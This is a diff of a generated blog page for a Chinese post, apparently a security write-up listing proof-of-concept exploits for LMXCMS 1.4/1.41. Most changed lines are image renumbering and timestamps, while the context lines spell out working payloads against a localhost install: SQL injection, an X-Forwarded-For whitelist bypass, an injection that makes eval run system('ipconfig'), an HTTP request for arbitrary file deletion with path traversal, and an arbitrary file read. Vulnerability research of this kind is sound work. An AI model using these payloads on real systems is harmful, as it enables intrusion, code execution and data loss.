@@ -43,8 +43,9 @@
 <meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/13.png">
 <meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/14.png">
 <meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/15.png">
+<meta property="og:image" content="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/16.png">
 <meta property="article:published_time" content="2022-02-10T06:52:26.000Z">
-<meta property="article:modified_time" content="2022-02-10T06:59:35.134Z">
+<meta property="article:modified_time" content="2022-02-10T07:10:07.656Z">
 <meta property="article:author" content="lockcy">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
@@ -204,7 +205,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-02-10 14:52:26 / 修改时间：14:59:35" itemprop="dateCreated datePublished" datetime="2022-02-10T14:52:26+08:00">2022-02-10</time>
+              <time title="创建时间：2022-02-10 14:52:26 / 修改时间：15:10:07" itemprop="dateCreated datePublished" datetime="2022-02-10T14:52:26+08:00">2022-02-10</time>
             </span>
 
           
@@ -261,23 +262,24 @@
 <img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/7.png" class="">
 <img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/8.png" class="">
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poc: http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;lmxcms1.4&#x2F;admin.php?m&#x3D;Acquisi&amp;a&#x3D;showCjData&amp;lid&#x3D;-1+union+select+1,1,1,(select+1+and+(updatexml(1,concat(0x7e,(select+database()),0x7e),1))),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</span><br></pre></td></tr></table></figure>
+<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/9.png" class="">
 <p><strong>1.4/1.41绕过ip白名单</strong></p>
 <p>后台ip白名单可通过X-Forwarded-For 绕过</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/9.png" class="">
+<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/10.png" class="">
 
 <p><strong>1.4/1.41后台任意代码执行</strong><br>c/admin/AcquisAction.class.php 中 318行eval执行了$temdata[‘data’]参数，该参数的值是从lmx_cj_list数据表中查询出的array字段的值，而查询时存在sql注入导致该字段可控，从而导致任意代码执行。</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/10.png" class="">
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poc: admin.php?m&#x3D;Acquisi&amp;a&#x3D;showCjData&amp;lid&#x3D;-1+union+select+1,1,1,&#39;1;system(\&#39;ipconfig\&#39;);&#39;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</span><br></pre></td></tr></table></figure>
 <img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/11.png" class="">
-<p><strong>1.4/1.41 后台任意文件删除</strong><br>c/admin/FileAction.class.php 中使用unlink方法删除文件，unlink方法调用php unlink方法，此处未对传入的路径做检查，存在任意文件删除。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poc: admin.php?m&#x3D;Acquisi&amp;a&#x3D;showCjData&amp;lid&#x3D;-1+union+select+1,1,1,&#39;1;system(\&#39;ipconfig\&#39;);&#39;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</span><br></pre></td></tr></table></figure>
 <img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/12.png" class="">
+<p><strong>1.4/1.41 后台任意文件删除</strong><br>c/admin/FileAction.class.php 中使用unlink方法删除文件，unlink方法调用php unlink方法，此处未对传入的路径做检查，存在任意文件删除。</p>
+<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/13.png" class="">
 
 <p>poc:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;lmxcms1.4&#x2F;admin.php?m&#x3D;File&amp;a&#x3D;delete HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 97</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost:8081</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost:8081&#x2F;lmxcms1.4&#x2F;admin.php?m&#x3D;File&amp;a&#x3D;index&amp;type&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">type&#x3D;0&amp;delImages&#x3D;%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87&amp;fid%5B%5D&#x3D;7#####&#x2F;test.txt</span><br></pre></td></tr></table></figure>
 <p>其中test.txt在index.php 同级目录下，且可使用..进行目录穿越。<br><strong>1.4/1.41 后台任意文件读取</strong><br>c/admin/TemplateAction.class.php</p>
-<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/13.png" class="">
 <img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/14.png" class="">
 <img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/15.png" class="">
+<img src="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/16.png" class="">
 <p>poc:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8081&#x2F;lmxcms1.4&#x2F;admin.php?m&#x3D;Template&amp;a&#x3D;editfile&amp;dir&#x3D;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
 
@@ -303,7 +305,7 @@
   <p><span>本文标题:</span>lmxcms全漏洞poc</a></p>
   <p><span>文章作者:</span></a></p>
   <p><span>发布时间:</span>2022年02月10日 - 14:52:26</p>
-  <p><span>最后更新:</span>2022年02月10日 - 14:59:35</p>
+  <p><span>最后更新:</span>2022年02月10日 - 15:10:07</p>
   <p><span>原始链接:</span><a href="/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/" title="lmxcms全漏洞poc">https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lockcy.github.io/2022/02/10/lmxcms%E5%85%A8%E6%BC%8F%E6%B4%9Epoc/"  aria-label="复制成功！"></i></span>
   </p>
